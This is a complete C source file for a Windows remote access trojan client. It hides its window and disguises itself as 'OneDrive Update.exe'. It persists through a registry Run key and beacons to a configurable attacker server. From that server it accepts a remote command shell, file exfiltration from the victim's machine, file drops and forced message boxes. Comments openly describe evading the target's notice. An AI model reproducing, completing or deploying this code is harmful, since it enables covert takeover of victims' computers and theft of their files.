#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string.h>
#include <direct.h>
#include <mswsock.h>

#pragma comment(lib, "Ws2_32.lib")

#define SERVERADDRESS "SEVERIP"  // CHANGE THIS TO YOUR IP
#define SERVERPORT "27015"

#define BUFSIZE 1024

SOCKET client;
char user[256];

char desktoppath[MAX_PATH];

int startup()
{
    char current[MAX_PATH];
    DWORD size = MAX_PATH;
    memset(current, 0, MAX_PATH);
    _getcwd(current, MAX_PATH);  // gets current directory 
    strcat(current, "\\client.exe");  // CHANGE THIS TO NEW FILENAME IF NECESSARY

    GetUserNameA(user, &size);

    memset(desktoppath, 0, MAX_PATH);

    strcat(desktoppath, "C:\\Users\\");
    strcat(desktoppath, user);
    strcat(desktoppath, "\\Desktop");

    // full path ends up as C:\Users\^USER^\Desktop

    char new[MAX_PATH];
    memset(new, 0, MAX_PATH);
    strcat(new, "C:\\Users\\");
    strcat(new, user);
    strcat(new, "\\AppData\\Local\\Microsoft\\OneDrive\\Update\\OneDrive Update.exe");

    // full path ends up as C:\Users\^USER^\AppData\Local\Microsoft\OneDrive\Update\OneDrive Update.exe
    // renames the file from client.exe to OneDrive Update.exe to attempt to get ignored if the target looks at running processes / registry run keys

    MoveFileA((LPCSTR)current, (LPCSTR)new);  // 

    HKEY hKey = NULL;

    LONG lSuccess = RegOpenKeyExA(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);  // opens HKCU
    if(lSuccess == ERROR_SUCCESS)
    {
        RegSetValueExA(hKey, (LPCSTR)"OneDrive Update", 0, REG_SZ, (unsigned char*)new, strlen(new));  // creates a new run key called OneDrive Update
        RegCloseKey(hKey);                                                                             // with the path set to where the client is stored
    }

    return 0;
}

int conntoserv()
{
    WSADATA wsaData;
    int loadDLL, getaddr, connection;

    loadDLL = WSAStartup(MAKEWORD(2,2), &wsaData);  // loading dll

    if(loadDLL != 0)
    {
        return 1;
    }

    client = INVALID_SOCKET;

    client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);  // create socket

    if(client == INVALID_SOCKET)
    {
        return 1;
    }

    struct sockaddr_in serveraddr;  

    serveraddr.sin_family = AF_INET;  // ipv4
    serveraddr.sin_addr.S_un.S_addr = inet_addr(SERVERADDRESS);  // inet_addr converts string address to binary format
    serveraddr.sin_port = htons(27015);  // host to network short conversion

    connection = connect(client, (struct sockaddr*)&serveraddr, sizeof(struct sockaddr));  // connecting to server

    if(connection == SOCKET_ERROR)
    {
        return 1;
    }

    return 0;
}

int shell()
{
    char command[64];
    char buf[BUFSIZE];
    char result[BUFSIZE];

    FILE* getpath = popen("cd", "r");

    char originpath[MAX_PATH];  // stores current directory so we can cd back after the shell is closed

    memset(originpath, 0, MAX_PATH);

    fgets(originpath, MAX_PATH, getpath);

    SetCurrentDirectory((LPCSTR)desktoppath);  // sets directory to the target's desktop
                                               // this is so that shell commands are executed here as there is higher
                                               // chance that interesting files will be here

    while(strncmp(command, "QUIT", 4) != 0)
    {
        memset(command, 0, 64);
        memset(buf, 0, BUFSIZE);
        memset(result, 0, BUFSIZE);

        recv(client, command, 64, 0);  // receive command from server

        if(strncmp(command, "QUIT", 4) != 0)
        {
            if(strncmp(command, "changedir", 9) == 0)
            {
                char currentdir[MAX_PATH];
                memset(currentdir, 0, MAX_PATH);
                _getcwd(currentdir, MAX_PATH);

                send(client, currentdir, strlen(currentdir), 0);

                char newdir[128];
                memset(newdir, 0, 128);
                recv(client, newdir, 128, 0);

                SetCurrentDirectory((LPCSTR)newdir);
            }
            else
            {
                FILE* pipe = popen(command, "r");

                while(fgets(buf, BUFSIZE, pipe) != NULL)
                {
                    strcat(result, buf);
                }

                if(strlen(buf) == 0)  // checks if result is empty
                {
                    char* OK = "+ Command executed with no result";
                    send(client, OK, strlen(OK), 0);
                }
                else
                {
                    send(client, result, strlen(result), 0);  // sends the command response back to the server
                }
            }
        } 
        else 
        {
            SetCurrentDirectory((LPCSTR)originpath);  // cd back to original directory
        }
    }

    return 0;
}

int downloadfile()
{
    SetCurrentDirectory((LPCSTR)desktoppath);  // cd to target's desktop to beign with

    char filename[BUFSIZE];
    int recvfilename = recv(client, filename, BUFSIZE, 0);  // stores the file name

    char buf[4096];
    int received = recv(client, buf, 4096, 0);  // stores the file data in buf

    buf[received] = '\0';

    FILE* file;
    file = fopen(filename, "w");  // creating a new file with specified filename in write mode

    fprintf(file, buf);  // writing the data from buf to the new file

    fclose(file);  // closing the file

    return 0;
}

int uploadfile()
{
    char filename[BUFSIZE];
    memset(filename, 0, BUFSIZE);
    int received = recv(client, filename, BUFSIZE, 0);

    char newdir[BUFSIZE];
    memset(newdir, 0, BUFSIZE);
    recv(client, newdir, BUFSIZE, 0);

    SetCurrentDirectory((LPCSTR)newdir);  // cd to the directory that the file is in

    filename[received] = '\0';

    FILE* file;
    file = fopen(filename, "r");  // opens the file in read mode

    char filecontents[4096];
    memset(filecontents, 0, 4096);
    fgets(filecontents, 4096, file);  // stores file contents 

    fclose(file);  // closing the file 

    send(client, filecontents, strlen(filecontents), 0);  // sending all the file content over to the server

    return 0;
}

int msgbox()
{
    char title[BUFSIZE];
    char content[BUFSIZE];

    int titlerecv = recv(client, title, BUFSIZE, 0);

    if(titlerecv != SOCKET_ERROR)
    {
        title[titlerecv] = '\0';

        int contentrecv = recv(client, content, BUFSIZE, 0);

        if(contentrecv != SOCKET_ERROR)
        {
            content[contentrecv] = '\0';
            
            MessageBox(NULL, (LPCSTR)content, (LPCSTR)title, MB_ICONWARNING | MB_SETFOREGROUND | MB_OK);  // creates a message box using title and content received from server
        }                                                                                                 // message box is configured to have a warning icon and be
    }                                                                                                     // set to foreground by default, forcing the target to see it

    return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR CmdLine, int CmdShow)
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);  // hiding cmd window when program is run so target isnt suspicious
    
    startup(); 
    
    while(TRUE)  // infinite loop connecting to server every 5 seconds
    {
        Sleep(5000);  // milliseconds
        int online = conntoserv();

        if(online == 0)
        {
            char buf[10];
            int received = recv(client, buf, 10, 0);

            buf[received] = '\0';

            if(strncmp(buf, "CMD", strlen(buf)) == 0)
            {
                shell();
            }
            else if(strncmp(buf, "FUP", strlen(buf)) == 0)
            {
                downloadfile();
            }
            else if(strncmp(buf, "FDO", strlen(buf)) == 0)
            {
                uploadfile();
            }
            else if(strncmp(buf, "MSG", strlen(buf)) == 0)
            {
                msgbox();
            }
            else
            {
                continue;
            }
        }
        else
        {
            continue;
        }
    }

    return 0;
}